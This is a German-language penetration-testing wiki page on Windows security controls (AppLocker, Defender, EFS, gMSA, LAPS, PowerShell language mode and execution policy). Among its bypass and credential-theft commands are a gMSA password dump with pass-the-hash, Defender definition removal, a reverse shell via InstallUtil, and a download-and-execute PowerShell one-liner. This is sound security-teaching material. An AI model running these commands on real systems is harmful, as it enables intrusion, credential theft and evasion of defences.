# Windows-Sicherheitskontrollen

{{#include ../../banners/hacktricks-training.md}}

## AppLocker-Richtlinie

Eine Anwendungs-Whitelist ist eine Liste genehmigter Softwareanwendungen oder ausführbarer Dateien, die auf einem System vorhanden sein und ausgeführt werden dürfen. Ziel ist es, die Umgebung vor schädlicher Malware und nicht genehmigter Software zu schützen, die nicht den spezifischen Geschäftsanforderungen einer Organisation entspricht.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) ist Microsofts **Lösung für Anwendungs-Whitelisting** und gibt Systemadministratoren die Kontrolle darüber, **welche Anwendungen und Dateien Benutzer ausführen können**. Sie bietet **granulare Kontrolle** über ausführbare Dateien, Skripte, Windows-Installationsdateien, DLLs, verpackte Apps und Installationsprogramme für verpackte Apps.\
Organisationen **blockieren häufig cmd.exe und PowerShell.exe** sowie den Schreibzugriff auf bestimmte Verzeichnisse, **doch all das lässt sich umgehen**.

### Überprüfung

Prüfe, welche Dateien/Erweiterungen auf der Blacklist/Whitelist stehen:

```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

Dieser Registrierungspfad enthält die von AppLocker angewendeten Konfigurationen und Richtlinien und bietet eine Möglichkeit, die aktuell auf dem System durchgesetzten Regeln zu überprüfen:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Nützliche **beschreibbare Ordner**, um die AppLocker-Richtlinie zu umgehen: Wenn AppLocker die Ausführung beliebiger Dateien in `C:\Windows\System32` oder `C:\Windows` erlaubt, gibt es **beschreibbare Ordner**, die du dafür nutzen kannst.

```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```

- Häufig können auch **vertrauenswürdige** [**"LOLBAS's"**](https://lolbas-project.github.io/) Binaries nützlich sein, um AppLocker zu umgehen.
- **Schlecht geschriebene Regeln lassen sich ebenfalls umgehen**
  - Zum Beispiel: **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**. Du kannst überall einen **Ordner namens `allowed` erstellen**, und er wird zugelassen.
  - Organisationen konzentrieren sich oft darauf, die ausführbare Datei **`%System32%\WindowsPowerShell\v1.0\powershell.exe`** zu **blockieren**, vergessen aber die **anderen** [**Speicherorte der PowerShell-Executables**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), etwa `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` oder `PowerShell_ISE.exe`.
- **DLL enforcement** ist aufgrund der zusätzlichen Systemlast und des erforderlichen Testaufwands, um sicherzustellen, dass nichts kaputtgeht, nur sehr selten aktiviert. Daher helfen **DLLs als backdoors dabei, AppLocker zu umgehen**.
- Mit [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) oder [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) kannst du **Powershell**-Code in jedem Prozess **ausführen** und AppLocker umgehen. Weitere Informationen findest du hier: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Speicherung von Zugangsdaten

### Security Accounts Manager (SAM)

Lokale Zugangsdaten befinden sich in dieser Datei; die Passwörter sind gehasht.

### Local Security Authority (LSA) - LSASS

Die **Zugangsdaten** (gehasht) werden aus Gründen des Single Sign-On im **Speicher** dieses Subsystems **gespeichert**.\
**LSA** verwaltet die lokale **Sicherheitsrichtlinie** (Passwortrichtlinie, Benutzerberechtigungen ...), **Authentifizierung**, **Zugriffstoken** ...\
LSA **prüft** die bereitgestellten Zugangsdaten in der **SAM**-Datei (bei einer lokalen Anmeldung) und **kommuniziert** mit dem **Domänencontroller**, um einen Domänenbenutzer zu authentifizieren.

Die **Zugangsdaten** werden im **Prozess LSASS** **gespeichert**: Kerberos-Tickets, NT- und LM-Hashes, leicht entschlüsselte Passwörter.

### LSA secrets

LSA kann einige Zugangsdaten auf der Festplatte speichern:

- Passwort des Computerkontos in Active Directory (nicht erreichbarer Domänencontroller).
- Passwörter der Konten von Windows-Diensten
- Passwörter für geplante Tasks
- Weitere (Passwort von IIS-Anwendungen ...)

### NTDS.dit

Dies ist die Datenbank von Active Directory. Sie ist nur auf Domänencontrollern vorhanden.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) ist ein Antivirusprogramm, das in Windows 10 und Windows 11 sowie in Versionen von Windows Server verfügbar ist. Es **blockiert** gängige pentesting-Tools wie **`WinPEAS`**. Es gibt jedoch Möglichkeiten, **diese Schutzmaßnahmen zu umgehen**.

### Prüfen

Um den **Status** von **Defender** zu prüfen, kannst du das PS-Cmdlet **`Get-MpComputerStatus`** ausführen (prüfe den Wert von **`RealTimeProtectionEnabled`**, um festzustellen, ob der Schutz aktiv ist):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Zur Enumeration kannst du auch Folgendes ausführen:

```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## Verschlüsselndes Dateisystem (EFS)

EFS schützt Dateien durch Verschlüsselung und verwendet dafür einen **symmetrischen Schlüssel**, den **File Encryption Key (FEK)**. Dieser Schlüssel wird mit dem **öffentlichen Schlüssel** des Benutzers verschlüsselt und im **alternativen Datenstrom** $EFS der verschlüsselten Datei gespeichert. Wenn eine Entschlüsselung erforderlich ist, wird der entsprechende **private Schlüssel** des digitalen Zertifikats des Benutzers verwendet, um den FEK aus dem $EFS-Datenstrom zu entschlüsseln. Weitere Informationen findest du [hier](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Entschlüsselungsszenarien ohne Benutzeraktion** sind:

- Wenn Dateien oder Ordner auf ein Dateisystem ohne EFS verschoben werden, etwa [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), werden sie automatisch entschlüsselt.
- Verschlüsselte Dateien, die über das Netzwerk per SMB/CIFS-Protokoll gesendet werden, werden vor der Übertragung entschlüsselt.

Diese Verschlüsselungsmethode ermöglicht dem Besitzer **transparenten Zugriff** auf verschlüsselte Dateien. Allerdings reicht es nicht aus, einfach das Passwort des Besitzers zu ändern und sich anzumelden, um die Dateien zu entschlüsseln.

**Wichtige Erkenntnisse**:

- EFS verwendet einen symmetrischen FEK, der mit dem öffentlichen Schlüssel des Benutzers verschlüsselt wird.
- Bei der Entschlüsselung wird der private Schlüssel des Benutzers verwendet, um auf den FEK zuzugreifen.
- Unter bestimmten Bedingungen erfolgt eine automatische Entschlüsselung, zum Beispiel beim Kopieren auf FAT32 oder bei der Netzwerkübertragung.
- Der Besitzer kann ohne zusätzliche Schritte auf verschlüsselte Dateien zugreifen.

### EFS-Informationen prüfen

Prüfe, ob ein **Benutzer** diesen **Dienst verwendet hat**, indem du überprüfst, ob dieser Pfad vorhanden ist:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Prüfe mit cipher /c \<file>\, **wer** **Zugriff** auf die Datei hat\
Du kannst außerdem `cipher /e` und `cipher /d` in einem Ordner verwenden, um alle Dateien zu **verschlüsseln** bzw. zu **entschlüsseln**

### EFS-Dateien entschlüsseln

#### Als Authority System

Für diese Methode muss der **benutzer** des **Opfers** einen **Prozess** auf dem Host **ausführen**. Wenn das der Fall ist, kannst du mit einer `meterpreter`-Sitzung das Token des Benutzerprozesses imitieren (`impersonate_token` aus `incognito`). Oder du kannst einfach mit `migrate` zum Prozess des Benutzers wechseln.

#### Passwort des Benutzers kennen

Mimikatz dokumentiert, wie sich das Zertifikat bzw. der private Schlüssel des Benutzers importieren und EFS-geschützte Dateien entschlüsseln lassen, wenn das Passwort bekannt ist.<sup>[[6]](#references)</sup>

## Group Managed Service Accounts (gMSA)

Microsoft entwickelte **Group Managed Service Accounts (gMSA)**, um die Verwaltung von Dienstkonten in IT-Infrastrukturen zu vereinfachen. Im Gegensatz zu herkömmlichen Dienstkonten, bei denen häufig die Einstellung "**Password never expire**" aktiviert ist, bieten gMSAs eine sicherere und einfacher zu verwaltende Lösung:

- **Automatische Passwortverwaltung**: gMSAs verwenden ein komplexes Passwort mit 240 Zeichen, das sich automatisch entsprechend den Domänen- oder Computerrichtlinien ändert. Dieser Vorgang wird vom Key Distribution Service (KDC) von Microsoft verwaltet, sodass keine manuellen Passwortänderungen erforderlich sind.
- **Erhöhte Sicherheit**: Diese Konten können nicht gesperrt werden und nicht für interaktive Anmeldungen verwendet werden, was ihre Sicherheit erhöht.
- **Unterstützung mehrerer Hosts**: gMSAs können von mehreren Hosts gemeinsam verwendet werden und eignen sich daher ideal für Dienste, die auf mehreren Servern laufen.
- **Unterstützung geplanter Aufgaben**: Im Gegensatz zu verwalteten Dienstkonten unterstützen gMSAs die Ausführung geplanter Aufgaben.
- **Vereinfachte SPN-Verwaltung**: Das System aktualisiert den Service Principal Name (SPN) automatisch, wenn sich die sAMaccount-Details oder der DNS-Name des Computers ändern, und vereinfacht so die SPN-Verwaltung.

Die Passwörter von gMSAs werden in der LDAP-Eigenschaft _**msDS-ManagedPassword**_ gespeichert und von Domain Controllern (DCs) alle 30 Tage automatisch zurückgesetzt. Dieses Passwort ist ein verschlüsselter Datenblock namens [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), der nur von autorisierten Administratoren und den Servern abgerufen werden kann, auf denen die gMSAs installiert sind. So wird eine sichere Umgebung gewährleistet. Für den Zugriff auf diese Informationen ist eine gesicherte Verbindung wie LDAPS erforderlich, oder die Verbindung muss mit 'Sealing & Secure' authentifiziert werden.

![NTLM-Authentifizierung weiterleiten, um ein gMSA-Passwort abzurufen](../../images/asd1.png)<sup>[[1]](#references)</sup>

Du kannst dieses Passwort mit [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**<sup>[[2]](#references)</sup> auslesen.

```
/GMSAPasswordReader --AccountName jkohler
```

[**Weitere Informationen findest du in der archivierten Originalforschung**](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/).<sup>[[1]](#references)</sup>

Dieselbe Forschung erklärt, wie ein **NTLM relay attack** ein **gMSA-Passwort** erhalten kann, wenn der weitergeleitete Principal zum Lesen von `msDS-ManagedPassword` berechtigt ist.<sup>[[1]](#references)</sup>

### gMSA-Passwort durch ACL-Verkettung auslesen (GenericAll -> ReadGMSAPassword)

In vielen Umgebungen können Benutzer mit geringen Berechtigungen ohne Kompromittierung des DC auf gMSA-Secrets zugreifen, indem sie falsch konfigurierte Objekt-ACLs ausnutzen:<sup>[[3]](#references)</sup>

- Einer Gruppe, die du kontrollieren kannst (z. B. über GenericAll/GenericWrite), wird `ReadGMSAPassword` für ein gMSA gewährt.
- Indem du dich dieser Gruppe hinzufügst, erhältst du das Recht, den `msDS-ManagedPassword`-Blob des gMSA über LDAP auszulesen und daraus nutzbare NTLM-Credentials abzuleiten.

Typischer Ablauf:

1) Finde den Pfad mit BloodHound und markiere deine Foothold-Principals als Owned. Achte auf Kanten wie:
   - GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Füge dich der zwischengeschalteten Gruppe hinzu, die du kontrollierst (Beispiel mit bloodyAD):

```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```

3) Lies das verwaltete gMSA-Passwort über LDAP aus und leite den NTLM-Hash ab. NetExec automatisiert das Auslesen von `msDS-ManagedPassword` und die Umwandlung in NTLM:

```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```

4) Authentifiziere dich als gMSA mit dem NTLM-Hash (kein Klartext erforderlich). Wenn sich das Konto in der Gruppe Remote Management Users befindet, funktioniert WinRM direkt:

```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```

Hinweise:
- LDAP-Lesezugriffe auf `msDS-ManagedPassword` erfordern Sealing (z. B. LDAPS/Sign+Seal). Tools übernehmen dies automatisch.
- gMSAs erhalten oft lokale Rechte wie WinRM. Prüfe die Gruppenmitgliedschaft (z. B. Remote Management Users), um Lateral Movement zu planen.
- Wenn du nur den Blob benötigst, um den NTLM-Hash selbst zu berechnen, siehe die Struktur MSDS-MANAGEDPASSWORD_BLOB.

Ein weiterer ACL-Pfad ist eine Schreibberechtigung für das gMSA-Objekt selbst. `msDS-GroupMSAMembership` ist der Sicherheitsdeskriptor, anhand dessen festgelegt wird, welche Principals das verwaltete Passwort abrufen dürfen. Die Schema-GUID lautet `888eedd6-ce04-df40-b462-b8a50e41ba38`. Eine exakte `WriteProperty`-ACE für dieses Attribut für eine Gruppe, die du kontrollierst, könnte es ermöglichen, die Liste der leseberechtigten Principals zu ändern. Das ist etwas anderes, als bereits in dieser Liste eingetragen zu sein. Prüfe die vollständige DACL, verweigernde und geerbte ACEs sowie die effektiven Berechtigungen, bevor du davon ausgehst, dass dieser Pfad nutzbar ist. Nach einer neuen Gruppenmitgliedschaft muss das Token bzw. die Sitzung aktualisiert werden, bevor du versuchst, das Passwort auszulesen.<sup>[[7]](#references)</sup>



## LAPS

Die **Local Administrator Password Solution (LAPS)**, die unter [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) heruntergeladen werden kann, ermöglicht die Verwaltung lokaler Administratorpasswörter. Diese Passwörter sind **zufällig generiert**, eindeutig und werden **regelmäßig geändert**. Sie werden zentral in Active Directory gespeichert. Der Zugriff auf diese Passwörter wird mithilfe von ACLs auf autorisierte Benutzer beschränkt. Bei ausreichenden Berechtigungen können lokale Admin-Passwörter ausgelesen werden.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

Der [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) von PowerShell **schränkt viele Funktionen ein**, die für eine effektive Nutzung von PowerShell erforderlich sind. Dazu gehören das Blockieren von COM-Objekten, die Zulassung ausschließlich genehmigter .NET-Typen, XAML-basierte Workflows, PowerShell-Klassen und mehr.

### **Prüfen**

```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```

### Bypass

```bash
#Easy bypass
Powershell -version 2
```

Auf aktuellen Windows-Versionen funktioniert dieser Bypass nicht mehr, aber du kannst [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) verwenden.\
**Zum Kompilieren musst du möglicherweise** **einen** _**Verweis hinzufügen**_ -> _Browse_ ->_Browse_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` hinzufügen und das Projekt auf **.Net4.5** **ändern**.

#### Direkter Bypass:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```

#### Reverse shell:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```

Du kannst [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) oder [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) verwenden, um **Powershell**-Code in jedem Prozess **auszuführen** und den eingeschränkten Modus zu umgehen. Weitere Informationen findest du hier: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## PS-Ausführungsrichtlinie

Standardmäßig ist sie auf **restricted** gesetzt. Die wichtigsten Möglichkeiten, diese Richtlinie zu umgehen:

```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```

Mehr dazu findest du [hier](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[5]](#references)</sup>

## Schnittstelle für Sicherheitsdienstanbieter (SSPI)

Dies ist die API, die zur Authentifizierung von Benutzern verwendet werden kann.

SSPI wählt ein geeignetes Authentifizierungsprotokoll für zwei kommunizierende Computer aus und bevorzugt Kerberos, sofern verfügbar. Diese Protokolle werden von Security Support Providers (SSPs) implementiert, die als DLLs unter Windows installiert sind. Beide Kommunikationspartner müssen den ausgehandelten Provider unterstützen.

### Wichtige SSPs

- **Kerberos**: Der bevorzugte Provider
  - %windir%\Windows\System32\kerberos.dll
- **NTLMv1** und **NTLMv2**: Aus Kompatibilitätsgründen
  - %windir%\Windows\System32\msv1_0.dll
- **Digest**: Webserver und LDAP, Passwort in Form eines MD5-Hashs
  - %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL und TLS
  - %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Wird verwendet, um das zu verwendende Protokoll auszuhandeln (Kerberos oder NTLM, wobei Kerberos standardmäßig verwendet wird)
  - %windir%\Windows\System32\lsasrv.dll

#### Bei der Aushandlung können mehrere Methoden oder nur eine angeboten werden.

## UAC – Benutzerkontensteuerung

Die [Benutzerkontensteuerung (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ist eine Funktion, die **eine Zustimmungsabfrage für Aktivitäten mit erhöhten Rechten** ermöglicht.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [1] [Relaying für gMSA – cube0x0 (Internet Archive)](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/)
- [2] [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [3] [HTB Sendai – 0xdf: gMSA über Rechteverkettung zu WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [4] [darthsidious – AppLocker und den PowerShell Constrained Language Mode umgehen](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [5] [NetSPI – 15 Möglichkeiten, die PowerShell-Ausführungsrichtlinie zu umgehen](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [6] [howto ~ EFS-Dateien entschlüsseln](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [7] [Microsoft – Attribut ms-DS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
{{#include ../../banners/hacktricks-training.md}}
